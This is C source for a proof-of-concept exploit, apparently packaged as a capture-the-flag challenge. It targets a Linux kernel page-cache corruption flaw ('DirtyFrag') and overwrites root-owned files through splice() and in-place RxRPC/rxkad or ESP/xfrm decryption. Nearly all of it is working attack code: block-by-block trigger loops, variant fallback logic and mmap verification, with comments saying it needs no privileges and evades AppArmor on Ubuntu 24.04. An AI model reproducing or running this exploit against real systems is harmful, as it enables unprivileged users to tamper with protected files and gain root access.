/**
 * CVE-2026-PENDING-DIRTYFRAG PoC - CTF Challenge Mode
 *
 * DirtyFrag: page cache corruption via splice() shared pages.
 *
 * Dual-variant exploit with automatic fallback:
 *
 * Variant 1 - RxRPC/rxkad (preferred, CVE-2026-43500):
 *   Uses AF_RXRPC + rxkad v1 token with attacker-chosen session key.
 *   Kernel's rxkad_verify_packet_1() decrypts data in-place via
 *   pcbc(fcrypt) on page-cache pages shared through splice().
 *   No user namespaces required. Works on Ubuntu 24.04 (AppArmor safe).
 *
 * Variant 2 - ESP/xfrm (fallback, CVE-2026-43284):
 ...
 *   to page cache. Works on WSL2 where AF_RXRPC is unavailable.
 *
 * Fallback logic: Try RxRPC first -> if fails -> try ESP.
 *
 * CTF Modes:
...
/* ========================================================================
 * do_rxrpc_exploit - RxRPC variant: trigger page cache writes
 *
 * For each 8-byte block of write_value, triggers one kernel decrypt
 * at the corresponding file offset. The initial file content was
 * pre-computed by the Prepare handler as fcrypt_encrypt(SESSION_KEY, block).
 * After kernel decrypts: file[offset:offset+8] = write_value[offset:offset+8]
 * ======================================================================== */
static int do_rxrpc_exploit(const char *target_path, const char *write_value, size_t val_len)
{
    fcrypt_init_sboxes();

    poc_log("=== RxRPC/rxkad exploit path (no namespace needed) ===");
    ...
    size_t padded_len = ((val_len + 7) / 8) * 8;
    int num_blocks = padded_len / 8;
    poc_log("write_value length=%zu, padded=%zu, blocks=%d", val_len, padded_len, num_blocks);

    /* Trigger kernel decrypt for each block (with per-block retry) */
    int success_count = 0;
    for (int i = 0; i < num_blocks; i++) {
        off_t offset = (off_t)(i * 8);
        int block_ok = 0;
        for (int attempt = 0; attempt < 3; attempt++) {
            poc_log("Triggering block %d at offset %lld (attempt %d/3)...",
                    i, (long long)offset, attempt + 1);
            if (do_one_rxrpc_trigger(rfd, offset) == 0) {
                block_ok = 1;
                break;
            }
        ...
        /* Delay between blocks for kernel processing */
        usleep(100 * 1000);
    }

    poc_log("Completed %d/%d triggers successfully", success_count, num_blocks);

    /* Verify via mmap */
    usleep(50 * 1000);
    const char *m = (const char *)map;
    poc_log("Post-trigger content (first %zu bytes): ", val_len);
    int match = (memcmp(m, write_value, val_len) == 0);
    poc_log("Verification via mmap: %s", match ? "MATCH" : "MISMATCH");
...
/* ========================================================================
 * mode_write_root_file - CTF Write Mode (dual-variant page cache corruption)
 *
 * Strategy:
 *   1. Try RxRPC variant: triggers kernel's rxkad in-place decrypt on
 *      page cache pages shared through splice(). Falls back to ESP if
 *      AF_RXRPC is unavailable.
 *   2. If RxRPC fails (e.g. no AF_RXRPC on WSL2): Fall back to ESP variant.
 ...
 *
 *   RxRPC: No user namespaces, no capabilities, AppArmor safe.
 *   ESP:   Requires unprivileged user namespace, but no AF_RXRPC.
 * ======================================================================== */
static int mode_write_root_file(poc_args_t *args)
{
    ...
    /* Step 2: Execute exploit (RxRPC first, ESP fallback) */
    printf("%s%s (attempting via rxrpc/rxkad...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int exploit_ret = do_rxrpc_exploit(args->root_file, args->write_value, val_len);

    if (exploit_ret != 0) {
        poc_log("RxRPC variant failed (ret=%d), trying ESP/xfrm fallback...",
                exploit_ret);
        printf("%s%s (attempting via esp/xfrm fallback...)\n",
               CTF_WRITE_ATTEMPT, args->write_value);
        exploit_ret = do_esp_exploit(args->root_file, args->write_value, val_len);
    }
    ...
    if (exploit_ret == 0 || strncmp(after, args->write_value, val_len) == 0) {
    ...
    if (strcmp(after, original) != 0) {
        ...
        poc_print_fail("partial page cache corruption (rxrpc triggered but mismatch)");
        return 1;
    }

    poc_log("Write failed: content unchanged");
    poc_print_fail("page cache not modified - rxrpc module may not be available");
    return 1;
}
...
int main(int argc, char *argv[])
{
    ...
    poc_log("=== CVE-2026-PENDING-DIRTYFRAG CTF PoC ===");
    poc_log("Vuln: DirtyFrag rxrpc/rxkad page cache corruption via splice");
